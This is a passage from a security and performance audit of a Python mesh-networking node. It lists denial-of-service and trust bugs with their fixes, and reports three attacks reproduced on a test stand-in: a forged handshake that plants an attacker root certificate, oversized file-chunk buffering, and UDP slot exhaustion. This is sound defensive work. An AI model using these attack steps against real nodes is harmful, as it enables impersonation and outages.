cell("Round trip", quality.rtt_ms != null ? quality.rtt_ms + " ms" : ...)
cell("Jitter", quality.jitter_ms == null ? "—" : quality.jitter_ms + " ms")
```

`value` is interpolated raw. Everywhere else in the same file — and in
`console.js`, `fleet.js`, `chat.js` — values go through `esc()`; these three do
not, because they are "obviously numbers". They are numbers when the JSON comes
from this node. Under a remote context (`X-NMesh-Node`), `do_GET` proxies the
request through the fleet app to **another node's console** and returns its
answer verbatim, so `quality.rtt_ms` is whatever that node chose to send — a
string, if it likes.

**Impact** — a compromised managed node injects markup into the operator's
console origin. The strict CSP (`default-src 'self'`, no `'unsafe-inline'`)
blocks inline event handlers and injected inline scripts, so this is not
script execution today — it is defacement and UI spoofing (a fabricated node
identity, a fake status). It becomes script execution the day the CSP gains
`'unsafe-inline'` or an asset with a JSONP-ish shape appears under `'self'`.

**Fixing it without breaking something** — wrap those three in `esc()`, like
every sibling. More generally: values crossing the remote-console proxy are
*network input*, not local state, and the pages should treat them that way.

---

## 36 — medium — `_e2e_pending_kem` / `_e2e_pending_nonce` / `_e2e_attempt` are unbounded

> **Status — fixed.** `_forget_e2e` is the one place a destination is
> forgotten, and `send_data`'s eviction calls it instead of dropping the queue
> alone.

**Where** — `src/node.py`, `_initiate_e2e_handshake`, `_e2e_retry_loop`.

**What happens** — `send_data` correctly bounds the queue of half-open
destinations (`_MAX_PENDING_TARGETS = 256`, `_MAX_PENDING_PER_TARGET = 128`),
and `_e2e_pending_data` is the one table that respects it. The three tables
written beside it are not bounded by anything:

```python
self._e2e_pending_kem[target] = kem_secret
self._e2e_pending_nonce[target] = nonce
self._e2e_attempt[target] = time.monotonic()
```

They are pruned only when a handshake completes or when `_e2e_retry_loop`
notices the target has no backlog left. A target evicted from
`_e2e_pending_data` by the `_MAX_PENDING_TARGETS` bound leaves its entries in
all three behind — the eviction path (`del pending[next(iter(pending))]`) does
not touch them. Each entry holds an ML-KEM-768 secret key.

**Impact** — a slow leak driven by any app that sends to many unreachable
targets, and a matching growth in `_persist_state` (see **2**). Not
attacker-driven from the network, but it defeats the bound that *is* there.

**Fixing it without breaking something** — evict the three tables together with
`_e2e_pending_data`, in one helper, so there is one place that decides a target
is forgotten. Keep the retry loop's pruning: it is what makes a lost handshake
self-heal.

---

## 37 — medium — `DataConnector` counts only authenticated clients

> **Status — fixed.** Connections are counted from accept
> (`_MAX_PENDING_CLIENTS`) with an `_AUTH_DEADLINE`; each client has its own
> bounded outbox and writer task, so a slow app no longer stalls the pump; and
> the pump survives an unexpected exception.

**Where** — `src/data_connector.py`, `_handle_client`, `_pump`.

**What happens** — `if len(self._clients) >= _MAX_CLIENTS: writer.close()` runs
first, but a connection only enters `self._clients` *after* a successful AUTH.
A connection that never sends its AUTH frame is therefore never counted, and
there is no read timeout on that first frame — it sits in
`await _read_frame(reader)` for ever.

Separately, `_pump()` fans an inbound mesh message out to matching clients with
`await _write_frame(w, _RECV, body)` in a loop. One client that stops reading
blocks the `drain()`, and with it **every** app's inbound delivery — while
`_data_queue` (unbounded, see **7**) keeps filling. `_pump` also has no
exception guard around `receive_data()`/`_unframe`, so if it ever raises, the
task dies and inbound app data stops permanently with no restart.

**Impact** — a local process (or a container sharing the socket — an explicitly
supported deployment) can exhaust connector slots without a token, and one
sluggish app can stall the whole data plane.

**Fixing it without breaking something** — count connections from `accept`, not
from AUTH; put a short deadline on the AUTH frame; and give each client a
bounded outbound queue so a slow reader is dropped instead of blocking the
pump. Wrap the pump body so it survives an unexpected exception. The one-reader
rule in `ConnectorClient._pump` (gotchas §8b) is the *client* side and must not
be touched.

**Related, same file** — `_auth_for` evicts an arbitrary `AppAuth` when
`len(self._auths) >= _MAX_CLIENTS`, and the `AppAuth` carries that section's
`NonceCache`. Evicting a live section silently resets its replay protection.
Key the eviction on sections with no connected client.

---

## 38 — low — A corrupt console credential silently resets the password

> **Status — fixed.** `console_auth.read` raises `CredentialError` when a
> file is present and unreadable; only "no file" means generate.

**Where** — `src/console_auth.py`, `read`; `src/webconsole.py`,
`_load_or_create_credentials`.

`read()` answers `None` for anything it cannot parse ("unreadable or corrupt —
the caller regenerates"), and the caller then generates a fresh password and
writes it. A truncated `console.cred` therefore replaces the operator's password
with a random one that is only ever exposed as `self.generated_password` — which
a running service prints once, to a log nobody may be watching. Same shape as
**12**, one level less severe because the installer's reset script recovers it.

**Fixing it** — distinguish "no file" (generate) from "file present but
unreadable" (refuse to start, and say so), so a disk fault is not silently a
credential rotation.

---

## 39 — low — `_build_ssl_context` can pair a stale certificate with a fresh key

> **Status — fixed.** The pair is written as a unit when it was not loaded as
> one, and both files are created 0600 at open time.

**Where** — `src/webconsole.py`, `_load_or_create_cert` / `_build_ssl_context`.

`_load_or_create_cert` regenerates a pair unless **both** files exist;
`_build_ssl_context` then writes each file only `if not os.path.exists(...)`.
With `console_cert.pem` present and `console_key.pem` missing, the freshly
generated certificate is discarded, the freshly generated key is written, and
`load_cert_chain` is handed a mismatched pair — the console fails to start with
an opaque TLS error.

**Fixing it** — write both files (or neither) as one unit, keyed on whether a
pair was actually loaded.

---

## 40 — low — A signed app release can declare a million chunks

**Where** — `src/app_package.py`, `parse_manifest` / `parse_root`
(`_MAX_CHUNKS_PER_FILE = 1_000_000`); `src/node.py`, `fetch_app` → `dht_get`.

`reassemble_bytes` correctly bounds the *result* (`_MAX_TOTAL_BYTES`, and every
chunk is checked against its own hash), but the number of **lookups** is bounded
only by the declared chunk-key list. Each missing chunk costs a full Kademlia
lookup plus `_DHT_QUERY_TIMEOUT`, so a catalogue entry declaring a million
chunk keys turns one operator click on "install" into an operation that runs for
days. Any node may publish to the catalogue.

**Fixing it** — derive the chunk-count ceiling from `_MAX_TOTAL_BYTES` and the
chunk size, and refuse a manifest whose declared chunk count cannot match its
declared size.

---

# Performance — latency, wasted CPU, wasted memory

The same rule as above applies: the entry says where the cost is, how the code
reaches it, and what must not break when it is removed. Several of these are
also denial-of-service levers, because "one small packet buys a lot of work" is
the same sentence read from either side.

## P1 — The packet dispatch table is rebuilt for every packet

**Where** — `src/node.py`, `_handle_packet`.

The handler map is a dict literal *inside* the function:

```python
handlers = {
    DATA: self._handle_data,
    PING: self._handle_ping,
    ... 31 entries ...
}
handler = handlers.get(packet.type)
```

Every packet that reaches dispatch allocates a 31-entry dict and 31 bound-method
objects, then throws them away. This is the hottest path in the node — every
packet in, on every link.

**Fix** — build the map once (a module-level table of unbound functions, or an
instance attribute built in `__init__`). Keep the lookup exactly where it is;
the ordering of the gates above it is the security property and must not move.

## P2 — `NodeID.distance` is a Python loop over 20 bytes

**Where** — `src/node_id.py`.

```python
def distance(self, other):
    result = 0
    for a, b in zip(self._raw, other._raw):
        result = (result << 8) | (a ^ b)
    return result
```

Twenty iterations of big-integer shift-and-or, per call. It is the sort key of
`RoutingTable.get_closest`, `_route_candidates`, `kad_lookup` and
`_handle_find_node`, so it runs thousands of times per lookup.

**Fix** — `int.from_bytes(self._raw, "big") ^ int.from_bytes(other._raw, "big")`,
or cache the integer form on the `NodeID` at construction (it is immutable). The
XOR metric and its ordering are unchanged.

## P3 — `get_closest` materialises and sorts the whole routing table

**Where** — `src/routing.py`, `RoutingTable.all_entries` / `get_closest`.

`all_entries()` walks all 160 buckets and builds a fresh list (up to 3 200
entries); `get_closest` then sorts it in full and takes the first `count`.
`_handle_find_node` calls it with `_FIND_NODE_SCAN = 64` — for a 28-byte packet
an authenticated peer may send 512 times per 10 s window.

**Fix** — `heapq.nsmallest(count, ...)` instead of a full sort, and start from
the buckets nearest the target rather than from everything (the bucket index is
already the distance's bit length). Combined with **P2** this is the single
biggest win on the query path. Keep the "scan more than k because chain-less
entries are skipped" behaviour — `gotchas.md` §9 explains why scanning exactly
k left replies empty.

## P4 — Every UDP link polls at 100 Hz and pops from the front of a list

**Where** — `src/udp_transport.py`, `UDPTransport.receive`.

```python
while True:
    if self._decoded:
        return self._decoded.pop(0)
    if self._closed: raise ConnectionError(...)
    await asyncio.sleep(0.01)
```

Two costs. The poll adds up to 10 ms of latency to every packet on a UDP link
and burns 100 wakeups per second per link even at complete rest — with
`_MAX_PEERS_UDP = 128` that is 12 800 timer wakeups a second doing nothing.
And `list.pop(0)` is O(n) in the backlog.

**Fix** — an `asyncio.Event` set by `_process_frame`, and a `collections.deque`
with `popleft()`. That also gives the natural place to add the byte bound
finding **6** needs. `_process_frame` is a synchronous protocol callback, so it
must set the event rather than await anything.

## P5 — The reliability layer does O(window) work per received frame

**Where** — `src/udp_transport.py`, `_ReliableLink.process_ack` and
`_build_ack`.

`process_ack` copies the whole unacked key set (`for s in list(self._unacked.keys())`,
up to `_MAX_UNACKED = 256`) on every incoming frame, and then loops 32 more
times for the SACK bitmap. `_build_ack` iterates the entire reorder buffer (up
to `max_reorder`, default 256, operator-settable to 1024) — and it is called
again for every standalone ACK, which `_process_frame` emits after every data
frame.

**Fix** — keep the unacked sequence numbers in sorted order (they are issued
monotonically) and drop the acked prefix, instead of scanning; track the SACK
bitmap incrementally as frames land in `_reorder`. The modular-distance
reasoning that fixed the 2³² wrap (`gotchas.md` §8) must survive untouched.

## P6 — A fresh liboqs context per signature verification

**Where** — `src/crypto.py`, `CryptoIdentity.verify`; `src/cert.py`,
`_verify_dsa`.

```python
def verify(self, message, signature, public_key):
    with oqs.Signature(DSA_ALG) as verifier:
        return verifier.verify(message, signature, public_key)
```

Every verification constructs and tears down an ML-DSA-65 context. That happens
once per certificate parsed (`Certificate._build`), so decoding a `FOUND_NODE`
with a full pool is 32 constructions; a handshake chain is up to 8; every pseudo
claim, every release descriptor, every app-auth assertion is one more.

**Fix** — keep one verifier per algorithm (thread-local if the binding is not
re-entrant) and reuse it. This also directly reduces the cost of the DoS levers
in **17**, **28** and **11**.

## P7 — A fresh AES-GCM object per packet

**Where** — `src/crypto.py`, `SessionKey.encrypt` / `decrypt`.

`AESGCM(self._key)` is constructed on every call, so the key schedule is
rebuilt for every packet in and out. The key is fixed for the life of the
session.

**Fix** — build the `AESGCM` once in `__init__` / `from_key` and keep it. The
random 96-bit nonce per packet stays as it is.

## P8 — Persisting session state is a synchronous fsync on the event loop

**Status — fixed.** `_persist_state` marks dirty; `_state_writer_loop` writes
at most every `_STATE_WRITE_INTERVAL`, off the loop thread, and `stop()` flushes.


**Where** — `src/node.py`, `_persist_state`; `src/session_store.py`, `save`.

`save()` serialises every E2E session, every pending handshake, every queued
payload (hex-encoded, so twice the size) plus the whole routing export to JSON,
encrypts it, writes it and calls `os.fsync(fd)` — all synchronously, on the
event loop. `_persist_state()` is called from `_handle_handshake`,
`_handle_handshake_ack`, `_handle_e2e_handshake`, `_handle_e2e_handshake_ack`,
`_handle_data` (on a re-key promotion) and `send_data`.

So every handshake stops the entire node for the duration of a full
serialise-and-fsync, and the cost grows with the state (see **2** and **36**).

**Fix** — mark the state dirty and let one bounded background task write it,
off the loop, at most every few seconds and on shutdown. Keep the 0600-at-open
and atomic-replace behaviour exactly as it is.

## P9 — The certificate store is rewritten in full for every certificate

**Status — fixed.** Same mechanism as P8, sharing the one writer task.


**Where** — `src/node.py`, `_cert_add`; `src/cert_store.py`, `save`.

Covered as a security finding in **8**; the performance shape is worth stating
on its own: absorbing one chain of six certificates writes the entire store to
disk six times, synchronously, inside a receive loop.

**Fix** — one write per absorbed chain at most, and batched off the loop, as
for **P8**.

## P10 — `_EntryPacker.add` re-serialises every certificate up to three times

**Where** — `src/node.py`, `_EntryPacker.add`.

```python
for cert in entry.cert_chain:
    raw = cert.serialize()          # once, to size it
    ...
for cert in entry.cert_chain:
    blob += _POOL_INDEX.pack(self._index[cert.serialize()])   # again, as a dict key
```

`Certificate.serialize()` rebuilds the ~7 KB blob each time, and the second loop
uses it purely as a dictionary key. With up to `_FIND_NODE_SCAN = 64` candidates
per `FIND_NODE`, that is a lot of megabytes of pointless copying per query.

**Fix** — serialise once per certificate and keep the bytes (or memoise
`serialize()` on the `Certificate`, which is immutable once built).

## P11 — A release announce verifies the same signature three times

**Where** — `src/node.py`, `_handle_release_announce` → `_gossip_release`.

`_core_parse_release(release_bytes, self._identity.verify)` runs once for the
`holder` hint, once inside `self._releases.offer(...)`, and a third time inside
`_release_have_byte()` when the announce is re-gossiped. Three ML-DSA
verifications of identical bytes, on a path an authenticated peer drives 32
times per 10 s window.

**Fix** — parse once and pass the parsed document down.

## P12 — Pseudo search re-folds the whole book on every keystroke

**Where** — `src/pseudo_dir.py`, `PseudoBook.search`; reached from
`/api/pseudo?q=` (the console field searches as the operator types) and from the
connector's `_PSEUDO_LOOKUP`.

`rank(query, entry["pseudo"])` calls `fold()` on **both** arguments for every
entry in the book (up to `_MAX_NODES = 1024`). `fold()` is NFC-normalise +
casefold + NFD-decompose + filter + NFC-recompose — one of the most expensive
string operations in the standard library — so a single keystroke is ~2 048
Unicode normalisations.

**Fix** — store the folded form alongside the pseudo in the entry when the claim
is filed (it is already computed there, for `dir_key`), and fold the query once
before the loop. The ranking and its ordering stay exactly as they are.

## P13 — The spool transport blocks the event loop on file I/O

**Where** — `src/spool_transport.py`, `send` (`os.fsync`), `_read_new`
(`open`/`seek`/`read`), `receive` (`pop(0)`, poll), `SpoolServer._accept_loop`
(`os.listdir`).

Every one of these runs directly on the asyncio loop. The medium is explicitly
a removable device or a shared directory, i.e. exactly the kind that stalls for
seconds. `gotchas.md` §2 states the rule this breaks: "Any potentially slow
blocking I/O must be bounded AND off the loop AND not joined at shutdown."

`_read_new` also re-reads everything from `_offset` to EOF on each 20 ms poll,
and the spool files are append-only with no rotation, so a long-lived link grows
its files without limit.

**Fix** — move the reads, the writes and the `fsync` into a bounded daemon
thread (the `updater._bounded` / `ip_utils.bounded_getaddrinfo` shape is already
in the tree), and truncate or roll the spool files once both sides have
consumed past an offset.

## P14 — TCP framing copies the whole packet on every send

**Where** — `src/tcp_transport.py`, `send`.

```python
data = packet.pack()
self._writer.write(_FRAME.pack(len(data)) + data)
```

`_FRAME.pack(...) + data` allocates and copies the full payload — up to 60 KB —
once more per packet, for the sake of a two-byte prefix. At the stated 4 MB/s
target that is 4 MB/s of pure memcpy.

**Fix** — `writer.writelines((prefix, data))`, which the asyncio transport
gathers without an intermediate copy. `TCP_NODELAY` is already set, so this does
not cost an extra segment.

## P15 — `transport.setting()` walks the option list on every call

**Where** — `src/transport.py`, `BaseTransport.setting`.

When a name is not in `SETTINGS` (the normal case — settings default), the
lookup falls through to a linear scan of `OPTIONS`. It is called per received
frame (`process_incoming` reads `max_reorder`), per read (`TCPTransport.receive`
reads `read_timeout`), and per link check (`is_alive` reads
`keepalive_timeout`).

**Fix** — resolve the defaults into a dict once at class definition (or memoise
on first use) and invalidate it in `configure()`. The "replaced, never mutated
in place" property of `SETTINGS` makes that invalidation trivial and must be
kept.

## P16 — `_route_candidates` sorts every authenticated peer per forwarded packet

**Where** — `src/node.py`, `_route_candidates`.

Each forwarded packet builds the full authenticated-peer list, computes
`target.distance(...)` for every one of them (see **P2**), sorts, then slices to
`_ROUTE_SEND_FANOUT = 5`. On a relay this is the per-packet cost of routing.

**Fix** — `heapq.nsmallest(_ROUTE_SEND_FANOUT, ...)`. The ordering rules —
a direct link to the target first, then the observed reverse path, then XOR
proximity — must be preserved exactly; `gotchas.md` §11 explains why the hint
beats a fresh guess and why a direct link always keeps the lead.

## P17 — Gossip fan-out runs inside the ingress receive loop

**Status — fixed.** The three announce handlers hand the fan-out to
`_spawn_bounded`.


**Where** — `src/node.py`, `_gossip_pseudo`, `_gossip_catalog`,
`_gossip_release`, `_sync_*_to`.

Each of these does `await p.send(pkt)` in a loop over every peer, and is called
directly from a handler — i.e. from the ingress peer's receive task. One peer
whose TCP send buffer is full stalls the `drain()`, and with it the *other*
peer's link. It is the same failure `gotchas.md` §10 describes, arriving from
the send side.

**Fix** — hand the fan-out to `_spawn_bounded` (which already exists and is used
by `_announce_own_pseudo`) so the receive loop returns immediately. Bounding the
fan-out at the same time also addresses finding **11**.

## P18 — Small change, small win: the dedup cache stores a timestamp nobody reads

**Where** — `src/node.py`, `_is_seen`.

`self._seen_msgs[msg_id] = time.monotonic()` — the value is never read anywhere
(`grep -n _seen_msgs src/node.py` shows four sites, none of which look at it).
The eviction is purely FIFO on size. So every routable packet pays a
`time.monotonic()` call and a float allocation for nothing, and the table is an
`OrderedDict[int, float]` where a plain `dict[int, None]` (insertion-ordered
since 3.7) would do.

**Fix** — drop the value, or actually use it to expire entries by age, which
would make the dedup window a *time* window rather than a count window — a
better property under the flood described in **3**.

## P19 — `app_storage` fsyncs on the event loop

**Where** — `src/app_storage.py`, `_save` (`os.fsync(fd)`), reached from the
connector's `_STORE_PUT` on every write.

An app writing its drawer at any rate stalls the node once per write.

**Fix** — same shape as **P8**: batch, and write off the loop.

## P20 — 128 MiB of DHT and 16 MiB of session store are large defaults

**Where** — `src/dht.py` (`_MAX_BYTES = 128 * 1024 * 1024`),
`src/session_store.py` (`_MAX_FILE = 16 MiB`), `src/app_storage.py`
(`MAX_DRAWER_BYTES = 8 MiB × MAX_DRAWERS = 256` → 2 GiB of drawers).

These are bounds, so nothing is unbounded — but they are bounds sized for a
server, in a project whose stated goal is to run over BLE, LoRa and a USB stick.
The DHT ceiling in particular is filled entirely by peers (see **20**).

**Fix** — make them configurable (`config.py` already has the shape for it) and
default them far lower; a node that wants to be a big cache can say so.

---

# What was checked and found sound

Recording this matters as much as the findings: it says where an attacker's
effort is wasted, and it stops a later change from quietly removing a property
nobody knew was load-bearing.

- **`Packet` framing and `msg_id`.** Fixed-width fields, so the `msg_id`
  pre-image is unambiguous; TTL is correctly outside both the AAD and the id;
  `with_decremented_ttl` is only reachable behind a `ttl > 1` test.
- **Content addressing in the DHT.** `ContentStore.put` refusing
  `content_key(value) != key` closes the poisoning vector by construction, and
  `dht_get` re-checks the hash before caching. `app_dht` frames the app id into
  the hashed value, so a namespace cannot be crossed even with a known key.
- **The pseudo claim format.** The node id is derived from the key inside the
  claim and the signature is checked under that same key, so a claim can only
  ever name its author. Canonicalisation is checked *before* the signature, so a
  hostile name costs no verification. Timestamps are strictly increasing per id.
- **`app_auth`'s signing-domain separation.** Nothing signs app-supplied bytes;
  free-form context enters only as a 32-byte hash; `app_id` comes from the
  session, never the frame. (The one defect is the nonce ordering — **33**.)
- **The release install gates.** Pinned publisher, strictly newer version, and
  the package checked against the signed SHA-256 in `ReleaseStore.put` before
  `open_package` is even called. `open_package` refuses links, devices and
  unusable paths rather than sanitising them, and bounds the unpacked size while
  reading rather than after.
- **`updater.safe_relative` and `_refuse_unsafe_members`.** Absolute paths,
  `..`, NUL and links out of the tree are refused, not trimmed; the `data`
  filter is used where available and the pre-check makes the fallback safe.
- **Fleet's three gates.** `_open_signed` binds the assertion to the exact body
  bytes and to a per-message-kind purpose, and requires `principal.node_id ==
  src`; replies are matched against `_inflight` with a sender check; shell input
  is session-bound to the owner. `ENROL_NARROW` intersects rather than widens.
- **Subprocess use.** Everything goes through `create_subprocess_exec` with an
  argv list — there is no shell string anywhere in the tree. (The defect is argv
  *parsing*, not quoting — **30**.)
- **`fleet_console`'s loopback pin.** The certificate fingerprint is compared on
  the live socket *before* the request is sent, so the caller's token never
  reaches an impostor; `console_path_refusal` is applied on both the proxy side
  and the agent side, and the console's own routing matches the same prefixes,
  so there is no `/api/fleet` vs `/api/fleet/` gap.
- **`config.py`.** Bounded in bytes, lines, value length and list length, with
  per-setting coercion and no way for a value to become a path outside what the
  setting means.
- **The console's session handling.** `HttpOnly` + `SameSite=Strict` + `Secure`
  removes the CSRF surface; tokens are 32 random bytes with a sliding idle TTL
  under a lock; a password change revokes every other session but keeps the
  caller's.
- **HTML escaping in the pages.** `esc()` is a correct escaper and is applied
  consistently — `linkify` escapes *before* linkifying, and the URL pattern
  cannot re-introduce a raw delimiter. The one gap is **35**.

---

# Addendum — findings 41 to 45

These came out of the last pass over the app store, the relay tunnel and the
fleet ledger. They are listed after the performance section only because that is
the order they were found in; severity is stated per entry as above.

## 41 — high — The app-store catalogue can be filled and held for ever

> **Status — fixed.** `AppCatalog._make_room` evicts instead of refusing, with
> a per-author share (`MIN_AUTHORS`) so one key cannot own the table, and
> `_touch` keeps the least recently announced app at the front.

**Where** — `src/app_catalog.py`, `AppCatalog.offer`
(`MAX_APPS = 1024`); reached from `src/node.py`, `_handle_catalog_announce`.

**What happens** — when the catalogue is full, a new app id is simply refused:

```python
if len(self._apps) >= self._max:
    return None            # catalog full — reject new app ids
```

There is no eviction and no notion of priority. Publishing costs an adversary
nothing they do not already have: `parse_release` verifies that the descriptor
is signed by the key it names, and *any* node can sign its own releases. So
1 024 self-signed releases — gossiped once, from one authenticated link — fill
every reachable node's catalogue permanently (it is in-memory, so only a restart
clears it) and every subsequent legitimate app becomes undiscoverable. Each
entry also holds the full release blob (up to `MAX_VALUE = 60 000` bytes), so
the table is ~61 MB when full.

The contrast is instructive: `ReleaseCatalog` in `core_release.py` — the same
shape, one file away — solves exactly this with `_make_room`: a *trusted*
newcomer evicts an untrusted entry, an untrusted newcomer is refused. The app
catalogue has no equivalent because apps have no pinning concept.

**Impact** — a permanent, node-wide denial of app discovery, from one link,
plus the gossip amplification of finding **11** on the way in (each of the 1 024
is "new", so each is re-gossiped to every peer).

**Fixing it without breaking something** — give `AppCatalog` an eviction policy.
The cheapest one that is not gameable is LRU on *last announced* combined with a
per-author quota, so one key cannot own the table. If a pinning notion is
wanted, mirror `ReleaseCatalog` exactly rather than inventing a second policy.
Keep the `ts` anti-rollback check where it is — it is what terminates the
epidemic and it is correct.

## 42 — medium — Enrolment requests are unmetered and can fill the pending table

> **Status — fixed.** `FleetApp._request_allowed` meters every
> `_SIGNED_INBOUND` frame per sender, before `_open_signed` spends a
> verification on it.

**Where** — `src/apps/fleet.py`, `_on_enrol_request`; `src/apps/fleet_state.py`,
`add_pending_in` (`MAX_PENDING = 256`).

**What happens** — an `ENROL_REQUEST` is verified by `_open_signed` (an ML-DSA
verification over the exact body) and then stored as a pending request. There is
no rate limit on the plane, and no cap per sender. Node ids are free to mint, so
256 requests from 256 fresh identities fill `_pending_in`; after that
`add_pending_in` refuses new entries and a legitimate operator's request never
reaches the human who would accept it.

**Impact** — one unmetered signature verification per request (a CPU lever, like
**17** and **28**), and a denial of the one action that *starts* a management
relationship. The ledger itself is not widened — `_authorised` still gates
everything, and that asymmetry is correct — so this is denial, not escalation.

**Fixing it without breaking something** — rate-limit the fleet request planes
per sender the way the node rate-limits its gossip planes, and cap pending
requests per source id so one identity cannot hold many slots. Do not add an
automatic accept or expiry that could approve something: the invariant in
`Docs/Apps/fleet` — "a right is only ever added by a local decision on the
machine that bears it" — must survive.

## 43 — medium — `RelayedTransport`'s inbox is unbounded and its `receive` uses `wait_for`

> **Status — fixed.** `maxsize=_RELAY_QUEUE_MAX`, dropping on overflow, and
> `asyncio.timeout` in place of `wait_for` (gotchas §3b).

**Where** — `src/node.py`, `RelayedTransport.feed` / `receive`.

```python
def feed(self, inner: Packet) -> None:
    if not self._closed:
        self._queue.put_nowait(inner)          # asyncio.Queue() — no maxsize
...
async def receive(self):
    ...
    return await asyncio.wait_for(self._queue.get(), timeout=1.0)
```

Two problems in six lines. The queue has no `maxsize`, and it is filled from
`_handle_relay_carry` — which runs **before** the authentication gates, so an
unauthenticated peer that knows a seeker's node id can push into it (see
**18**). `_CARRY_RATE_MAX = 256` per 10 s per link bounds the rate, not the
total, and each entry can be a 60 000-byte packet.

And `asyncio.wait_for` on a path that must stay cancellable is exactly what
`gotchas.md` §3b tells you not to reintroduce: `wait_for` can swallow an outer
cancellation when the inner get completes in the same loop step, so
`_Peer.stop()` on a relayed peer can wait on a task that does not die. The
bounded `_PEER_STOP_TIMEOUT` saves it, but the whole point of §3b is that the
bound is the last resort, not the design.

**Fixing it** — give the queue a `maxsize` and drop on overflow, and use
`async with asyncio.timeout(...)` as `TCPTransport.receive` does.

## 44 — low — `PUNCH_REQUEST` is unmetered and sends two packets per request

> **Status — fixed.** `_punch_request_allowed`, through the shared
> `_gossip_allowed`.

**Where** — `src/node.py`, `_handle_punch_request`.

Every other plane that makes us emit traffic on a peer's say-so has a valve;
this one has none. Each request makes the relay send one `PUNCH_RELAY` to the
target and one back to the requester, so an authenticated peer gets a 1:2
multiplier on a link it does not pay for (the packet to the *target* crosses a
different link).

The addresses themselves are handled correctly — the requester's IP is the one
*we observed*, never one it supplied — which is what stops this from being a
dial amplifier aimed at a victim. Only the rate is missing.

**Fixing it** — put it behind `_gossip_allowed` with its own window, as the
catalog/release/directory planes are.

## 45 — low — Fire-and-forget tasks that are neither tracked nor bounded

> **Status — fixed.** All seven go through `_spawn_bounded`; the punch state
> is left alone when the ceiling refuses one, per gotchas.

**Where** — `src/node.py`: `_schedule_catalog_sync`, `_schedule_release_sync`,
`_schedule_pseudo_sync` (`asyncio.create_task(...)` with the result discarded),
`_on_seek_for_self` (`asyncio.ensure_future(self._start_relay_invite(...))`),
`_handle_punch_relay` (`asyncio.create_task(self._send_punch_probes(state))`),
`_complete_punch` (two `create_task` calls).

`_spawn_bounded` exists precisely for this and says why in its docstring — "a
reference, without which the loop may collect the task mid-flight, and a
ceiling, without which fire-and-forget work piles up under pressure". These
seven sites predate it or were missed. The event loop keeps only a weak
reference to a bare task, so any of them can be collected mid-flight; and none
of them is counted against `_MAX_DETACHED`.

The sync tasks are the ones with an attacker in the loop: each authenticating
peer starts three, and each walks the whole catalogue / release set / pseudo
book sending a packet per entry.

**Fixing it** — route all seven through `_spawn_bounded`. The punch ones need a
second look while doing it: `gotchas.md` warns that deleting `_punch_pending`
too eagerly breaks the punch deterministically, so a task refused by the ceiling
must leave that state alone.

---

---

# Verified by running it

Three of the findings were not only read but executed, on this tree, with a
test-only stand-in for `liboqs` (the machine had no build of it). The stand-in
replaces ML-DSA with deterministic HMACs whose verification is exact — a
tampered signature or a wrong key fails — which is all the node's *logic*
depends on. Nothing about the post-quantum primitives themselves is being
claimed here; what is claimed is the control flow around them.

## Finding 1 — the victim adopts the attacker's root

The victim dials out holding no invite code (`peer.join_code is None`, the
ordinary reconnect / routing-walk path). The attacker challenges as any
accepting server does, reads the victim's public key out of its `HANDSHAKE`,
forges an `issued_cert` naming the victim as subject, and answers with its own
self-signed certificate as the chain.

```
victim trusts attacker root before: False
victim trusts attacker root after : True
link authenticated as             : NodeID(c4338863…)
stranger's minted chain verifies  : True (anchor NodeID(c4338863…) )
```

The last line is the consequence: with that root in place, a certificate the
attacker mints for a **brand-new identity it has just generated** passes
`CertStore.verify_chain` on the victim. The invitation gate is gone for every
identity the attacker cares to create.

## Finding 27 — a one-byte file buffers gigabytes

The offer declares `size = 1` and `total = _MAX_CHUNKS`, then sends chunks far
larger than the sender would ever produce:

```
FILE_CHUNK_SIZE the sender uses : 48000
_MAX_CHUNKS the receiver allows : 262144
chunks a legitimate 256 MiB file needs: 5593
transfer accepted               : True
declared file size              : 1 bytes
buffered after 200 chunks       : 11800000 bytes
projected at the declared total : 15.5 GB
```

11.8 MB held for a declared one-byte file after 200 packets, and the ceiling the
code actually enforces is 15.5 GB — per transfer, with 64 concurrent transfers
allowed.

## Finding 5 — 128 datagrams close the UDP door for good

128 distinct source addresses each send one keepalive frame; every transport is
then marked closed (the peers went away); a new peer arrives, and one of the old
peers reconnects from its original address:

```
transports held        : 128
all closed             : True
new peer accepted      : False
dead transport replaced: False
remove_transport called anywhere in src/: src/udp_transport.py:691:    def remove_transport(...)
```

Neither the new peer nor the returning one can be served, and the only mention
of `remove_transport` in the whole tree is its own definition.

## Reproducing them

The three scripts are short enough to belong in `tests/` once the fixes land, as
the regression tests for each finding. They need only the existing
`tests/conftest.py` helpers (`FakeTransport`, `make_manager`) plus, for finding
27, nothing at all beyond `src.apps.chat`. Sketches:

- **1** — `MeshNode._inject_peer(FakeTransport())`, inject a `CHALLENGE`, read
  the `HANDSHAKE` back out of `fake.sent`, `_decode_handshake` it, build the
  ACK with `_encode_handshake_ack(ct, attacker_pub, [attacker_root],
  forged_cert, sig)`, inject it, then assert
  `victim._cert_store.is_root(attacker_id) is False`.
- **27** — `ChatApp(_NullClient())`, call `_on_offer` with `size=1,
  total=_MAX_CHUNKS`, then `_on_chunk` with oversized bodies, and assert the sum
  of buffered chunk lengths never exceeds the declared `size`.
- **5** — a `UDPServer` with a stub socket, 128 `_dispatch_datagram` calls from
  distinct addresses, close them all, then assert a new address is still
  accepted.


# Suggested order of work

Not a priority ranking by severity alone — by "what does fixing this unlock".

1. **Finding 1** on its own, first. It is the only one that breaks the trust
   model outright, and the fix is small and local (carry "we presented a code"
   forward on the `_Peer`). It wants its own commit and its own test.
2. **The bounds pass**: **27**, **6**, **7**, **2**, **36**, **43**. These are
   one idea applied six times, they are independently testable, and several of
   them are what make the other DoS levers actually dangerous.
3. **The ordering pass**: **3**, **33**, **34**. Three call sites, each a
   two-line move, each restoring a property the surrounding comment already
   claims.
4. **The receive-loop pass**: **9**, **14**, **16**, **P17**, then **P8** and
   **P9**. All of them are the same rule from `gotchas.md` §10, and fixing them
   together keeps the rule visible.
5. **The rate-limit pass**: **10**, **20**, **28**, **42**, **44**, plus keying
   the tables on identity rather than `id(peer)` (**15**). `_gossip_allowed` is
   already the one implementation to extend.
6. **The fleet pass**: **30** and **31** together — both are "a string from the
   network decides where a credential goes".
7. **Then the hot path**: **P1**, **P2**, **P3**, **P6**, **P7**, **P14**. These
   are pure wins with no behaviour change, and **P2**/**P3**/**P6** also cut the
   cost of the query-plane DoS levers by a large factor.

Each of these touches behaviour described in `Docs/Architecture/`. Per
`CLAUDE.md`, the document changes in the same commit as the code — in
particular `protocol.md`'s gate order (for **3**), `security.md`'s invitation
lockout (for **32**) and its handshake section (for **1**), `transports.md` for
the UDP findings, and a new `gotchas.md` entry for anything that turns out to
have been load-bearing.
